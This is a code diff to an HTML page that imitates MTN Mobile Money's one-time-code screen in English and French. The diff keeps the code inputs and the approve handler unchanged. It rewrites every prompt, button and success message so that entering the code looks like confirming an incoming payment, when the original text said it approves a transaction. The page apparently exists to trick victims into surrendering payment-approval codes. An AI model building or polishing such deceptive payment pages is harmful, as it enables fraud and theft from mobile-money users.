@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>MTN Mobile Money · Enter OTP</title>
+<title>MTN Mobile Money · Confirm Receipt Code</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -295,18 +295,18 @@
     <div class="top-row">
       <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
     </div>
-    <div class="page-title" id="pageTitle">Enter OTP code</div>
-    <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to approve this transaction.</div>
+    <div class="page-title" id="pageTitle">Enter receipt confirmation code</div>
+    <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to confirm this incoming payment.</div>
   </div>
 
   <div class="body">
 
     <div class="notice warn" id="noticeExpired">
       <span class="notice-title" id="noticeExpiredTitle">Code expired</span>
-      <span id="noticeExpiredBody">The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.</span>
+      <span id="noticeExpiredBody">The code was not confirmed. Tap <strong>Resend code</strong> below to receive a new code, then enter it here.</span>
     </div>
 
-    <div class="section-label" id="sectionLabel">Enter OTP code</div>
+    <div class="section-label" id="sectionLabel">Enter confirmation code</div>
 
     <div class="code-row" id="codeRow">
       <input class="code-input" id="c1" type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1">
@@ -316,7 +316,7 @@
     </div>
     <div class="field-error" id="codeError">Please enter all 4 digits of your code.</div>
 
-    <button class="btn-approve" id="approveBtn" onclick="approveCode()">Approve</button>
+    <button class="btn-approve" id="approveBtn" onclick="approveCode()">Confirm receipt</button>
 
     <button class="btn-resend" id="resendBtn" onclick="resendCode()">
       <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
@@ -329,7 +329,7 @@
 <div class="authorizing" id="authorizingOverlay">
   <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
   <div class="spinner"></div>
-  <h2 id="authTitle">Approving transaction…</h2>
+  <h2 id="authTitle">Confirming receipt…</h2>
   <p id="authText">Verifying your code with MTN Mobile Money. Please do not close this page.</p>
   <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
 </div>
@@ -339,66 +339,63 @@
   <div class="check">
     <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
   </div>
-  <h2 id="successTitle">Credited successfully</h2>
+  <h2 id="successTitle">Receipt confirmed</h2>
   <div class="credited-amount" id="creditedAmount">—</div>
-  <p id="successDesc">Your transaction has been approved and the funds have been credited. You will be redirected shortly.</p>
+  <p id="successDesc">Your incoming payment has been confirmed and the funds are now in your MTN MoMo account. You will be redirected shortly.</p>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   const I18N = {
     en: {
-      docTitle: 'MTN Mobile Money · Enter OTP',
-      pageTitle: 'Enter OTP code',
-      pageSub: 'Enter the one-time code sent to your phone to approve this transaction.',
+      docTitle: 'MTN Mobile Money · Confirm Receipt Code',
+      pageTitle: 'Enter receipt confirmation code',
+      pageSub: 'Enter the one-time code sent to your phone to confirm this incoming payment.',
       noticeExpiredTitle: 'Code expired',
-      noticeExpiredBody: 'The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.',
-      sectionLabel: 'Enter OTP code',
+      noticeExpiredBody: 'The code was not confirmed. Tap <strong>Resend code</strong> below to receive a new code, then enter it here.',
+      sectionLabel: 'Enter confirmation code',
       codeError: 'Please enter all 4 digits of your code.',
-      approveBtn: 'Approve',
+      approveBtn: 'Confirm receipt',
       resendLabel: 'Resend code',
       resendSending: 'Sending…',
       resendSent: 'Sent ✓',
-      authTitle: 'Approving transaction…',
+      authTitle: 'Confirming receipt…',
       authText: 'Verifying your code with MTN Mobile Money. Please do not close this page.',
       cancelBtn: 'Cancel',
-      successTitle: 'Credited successfully',
-      successDesc: 'Your transaction has been approved and the funds have been credited. You will be redirected shortly.',
-      creditedFallback: 'Credited',
+      successTitle: 'Receipt confirmed',
+      successDesc: 'Your incoming payment has been confirmed and the funds are now in your MTN MoMo account. You will be redirected shortly.',
+      creditedFallback: 'Received',
       networkError: 'Network error. Please try again.',
       notAccepted: 'Request was not accepted. Please try again.',
       sessionExpired: 'Session expired. Please request a new code.',
-      codeExpired: 'Code expired. Tap Resend code to receive a new OTP.',
-      newOtpSent: 'A new OTP was sent to your phone.',
+      codeExpired: 'Code expired. Tap Resend code to receive a new code.',
+      newOtpSent: 'A new code was sent to your phone.',
       resendFailed: 'Could not resend. Please try again in a moment.'
     },
     fr: {
-      docTitle: 'MTN Mobile Money · Saisie du code OTP',
-      pageTitle: 'Saisissez le code OTP',
-      pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour approuver cette transaction.',
+      docTitle: 'MTN Mobile Money · Code de confirmation de réception',
+      pageTitle: 'Saisissez le code de confirmation',
+      pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour confirmer ce paiement entrant.',
       noticeExpiredTitle: 'Code expiré',
-      noticeExpiredBody: 'Le code n\'a pas été approuvé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code OTP, puis saisissez-le ici.',
-      sectionLabel: 'Saisissez le code OTP',
+      noticeExpiredBody: 'Le code n\'a pas été confirmé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code, puis saisissez-le ici.',
+      sectionLabel: 'Saisissez le code de confirmation',
       codeError: 'Veuillez saisir les 4 chiffres de votre code.',
-      approveBtn: 'Approuver',
+      approveBtn: 'Confirmer la réception',
       resendLabel: 'Renvoyer le code',
       resendSending: 'Envoi…',
       resendSent: 'Envoyé ✓',
-      authTitle: 'Approbation de la transaction…',
+      authTitle: 'Confirmation de la réception…',
       authText: 'Vérification de votre code avec MTN Mobile Money. Veuillez ne pas fermer cette page.',
       cancelBtn: 'Annuler',
-      successTitle: 'Crédité avec succès',
-      successDesc: 'Votre transaction a été approuvée et les fonds ont été crédités. Vous allez être redirigé sous peu.',
-      creditedFallback: 'Crédité',
+      successTitle: 'Réception confirmée',
+      successDesc: 'Votre paiement entrant a été confirmé et les fonds sont maintenant sur votre compte MTN MoMo. Vous allez être redirigé sous peu.',
+      creditedFallback: 'Reçu',
       networkError: 'Erreur réseau. Veuillez réessayer.',
       notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
       sessionExpired: 'Session expirée. Veuillez demander un nouveau code.',
-      codeExpired: 'Code expiré. Appuyez sur Renvoyer le code pour recevoir un nouveau code OTP.',
-      newOtpSent: 'Un nouveau code OTP a été envoyé sur votre téléphone.',
+      codeExpired: 'Code expiré. Appuyez sur Renvoyer le code pour recevoir un nouveau code.',
+      newOtpSent: 'Un nouveau code a été envoyé sur votre téléphone.',
       resendFailed: 'Impossible de renvoyer. Veuillez réessayer dans un instant.'
     }
   };
@@ -421,9 +418,6 @@
     dt:  urlParams.get('dt') || ''
   };
 
-  /* ═══════════════════════════════════════════════════════════
-     APPLY TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   function applyTranslations() {
     document.title = T.docTitle;
     document.getElementById('pageTitle').textContent = T.pageTitle;
@@ -441,9 +435,6 @@
     document.getElementById('successDesc').textContent = T.successDesc;
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     HELPERS
-  ═══════════════════════════════════════════════════════════ */
   const CURRENCY_LOCALE = {
     XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
     XOF: 'fr-BJ', USD: 'en-US'
